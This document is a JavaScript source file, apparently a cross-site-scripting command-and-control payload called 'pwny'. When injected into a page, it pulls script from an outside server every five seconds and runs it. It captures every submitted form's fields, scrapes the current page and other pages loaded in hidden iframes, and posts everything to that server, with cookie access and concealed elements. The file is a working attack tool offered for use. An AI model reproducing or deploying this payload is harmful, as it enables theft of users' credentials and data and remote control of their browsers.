//

var pwny = {
	debug: false,
	endpoint: 'http://mentally-defective.com/pwnyXSSpress/server.php',
	recving: false,
	errno: 0,

	init: function (){
		this.socket = new pwnySocket(this.endpoint);
		this.data = {};
		this.interval = setInterval('pwny.recv()', 5000); 
		pwny.recv();
		
		
		if(this.debug){
			this.dbg = document.createElement('div');
			this.dbg.setAttribute('style', 'position: fixed; bottom: 2px; right: 2px; width: 300px; height: 100px; background: #eee; border: 1px solid #333;');
			document.body.appendChild(this.dbg);
		}
	},
	
	handleForms: function (){
		var f = document.getElementsByTagName('form');
		for(i=0; i<f.length; i++){
			f[i].onsubmit = function (){
				var myData = {mode: 'send_form'};
				for(j=0; j<this.elements.length; j++){
					myData[this.elements[j].name] = this.elements[j].value;
				}
				this.socket.send(myData);
			};
		}
	},
	
	send: function (data){
		data.cmdID = this.cmdID;
		data.mode  = 'cmd_reponse';
		this.socket.send(data);
	},
	
	recv: function (){
		if(!this.processing){
			this.socket.recv();
		}
	},
	
	queue: function (what, value){
		this.data[what] = value;
	},
	
	startCmd: function (id){
		this.processing = true;
		this.log('Setting cmdID: '+id);
		this.cmdID = id;
	},
	
	finishCmd: function (){
		this.send(this.data);
		this.processing = false;
		this.data = {};
	},
	
	
	fetchPage: function (page){
		if(page == window.location.pathname){
			var c = document.body.parentNode.innerHTML;
			pwny.socket.send({
				mode: 'page_response',  
				page_name: page, 
				content: escape(c)
			});
			
		} else {
			if(!this.fetchFrame){
				this.fetchFrame = document.createElement('iframe');
				if(!this.debug){
					this.fetchFrame.style.height = '0px';
					this.fetchFrame.style.width = '0px';
					this.fetchFrame.style.border = 'none';
					
				}
	
				document.body.appendChild(this.fetchFrame);
			}
	
			this.fetchFrame.onload = function (){
				var c = pwny.fetchFrame.contentDocument.body.parentNode.innerHTML;
				pwny.socket.send({
					mode: 'page_response',  
					page_name: page, 
					content: escape(c)
				});
			};
	
			this.fetchFrame.setAttribute('src', page);
		}

	},
	
	error: function (e){
		this.errno++;
		
		this.queue('error', 1);
		this.queue('error_'+ this.errno, e);
		this.log(e);
		if(this.processing){
			this.finishCmd();
		}
	},


	log: function (w){
		if(pwny.debug){
			var t = document.createElement('div');
			t.innerHTML = w;
			pwny.dbg.appendChild(t);
		}
	},
	clearLog: function (){
		pwny.dbg.innerHTML = '';
	},
	
	setCookie: function(name,value,expiredays){
		var exdate=new Date();
		exdate.setDate(exdate.getDate()+expiredays);
		document.cookie=name+ "=" +escape(value)+((expiredays==null) ? "" : ";expires="+exdate.toUTCString());
	},
	
	getCookie: function(name) {
		if (document.cookie.length>0) {
			c_start=document.cookie.indexOf(name + "=");
			if (c_start!=-1) {
				c_start=c_start + name.length+1;
				c_end=document.cookie.indexOf(";",c_start);
				if (c_end==-1) c_end=document.cookie.length;
				return unescape(document.cookie.substring(c_start,c_end));
			}
		}
		return "";
	}
};

var pwnySocket = function (endpoint){
	this.endpoint = endpoint;
	
	this.container = document.createElement('div');
	this.output = document.createElement('iframe');
	this.outputForm = document.createElement('form');

	
	this.output.setAttribute('id', 'sockframe');
	this.output.setAttribute('name', 'sockframe');
	this.outputForm.setAttribute('target', 'sockframe');
	this.outputForm.setAttribute('method', 'post');
	this.outputForm.setAttribute('action', this.endpoint);
	
	if(!pwny.debug){
		this.container.style.height = '0px';
		this.container.style.width = '0px';
		this.container.style.top = '0px';
		this.container.style.right = '0px';
		this.container.style.position = 'absolute';
		this.container.style.overflow = 'hidden';
	}
	
	document.body.appendChild(this.container);
	this.container.appendChild(this.outputForm);
	this.container.appendChild(this.output);
};

pwnySocket.prototype = {
		
	send: function (data){
		this.outputForm.innerHTML = '<input type="submit" />';
		if(typeof data == 'string'){
			data = {'data':data};
		}
		for(e in data){
			var tmp = document.createElement('input');
			tmp.setAttribute('name', e);
			tmp.setAttribute('value', data[e]);
			tmp.setAttribute('type', 'hidden');
			this.outputForm.appendChild(tmp);
		}
		
		this.outputForm.submit();
	},
	
	recv: function (){
		if(!this.recving){
			this.recving = true;
			if(this.input){
				this.container.removeChild(this.input);
			}
	
			this.input = document.createElement('script');
			this.input.setAttribute('src', this.endpoint);
			this.container.appendChild(this.input);

			this.recving = false;
		}
	}
};


pwny.init();
